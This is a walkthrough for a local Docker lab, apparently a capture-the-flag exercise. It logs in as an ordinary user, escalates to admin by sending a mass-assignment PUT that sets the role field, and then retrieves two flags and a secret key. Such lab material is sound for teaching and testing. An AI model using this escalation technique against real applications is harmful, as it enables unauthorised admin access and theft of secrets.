# Walkthrough

## Setup

```bash
docker compose up --build -d
until nc -z -w2 127.0.0.1 8084 2>/dev/null; do sleep 1; done && echo "ready"
```

## Log in and check the profile

```bash
curl -s -c /tmp/cookies.txt -o /dev/null -w "%{http_code}" \
    -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"password123"}' \
    http://127.0.0.1:8084/login
```

```
200
```

```bash
curl -s -b /tmp/cookies.txt http://127.0.0.1:8084/api/user/profile
```

```json
{"email": "alice@corp.local", "role": "user"}
```

## Confirm /admin is blocked

```bash
curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies.txt http://127.0.0.1:8084/admin
```

```
403
```

## Escalate role via mass assignment

```bash
curl -s -X PUT -b /tmp/cookies.txt \
    -H 'Content-Type: application/json' \
    -d '{"role":"admin"}' \
    http://127.0.0.1:8084/api/user/profile
```

```json
{"ok": true, "profile": {"email": "alice@corp.local", "role": "admin"}}
```

## Get flag 1

```bash
curl -s -b /tmp/cookies.txt http://127.0.0.1:8084/admin
```

```json
{"flag": "POC{...}", "message": "Welcome to the admin panel.", "users": [...]}
```

## Get flag 2

```bash
curl -s -b /tmp/cookies.txt http://127.0.0.1:8084/admin/secrets
```

```json
{"flag": "POC{...}", "secret_key": "prod-signing-key-7f3a9c2b"}
```

## Teardown

```bash
docker compose down
```
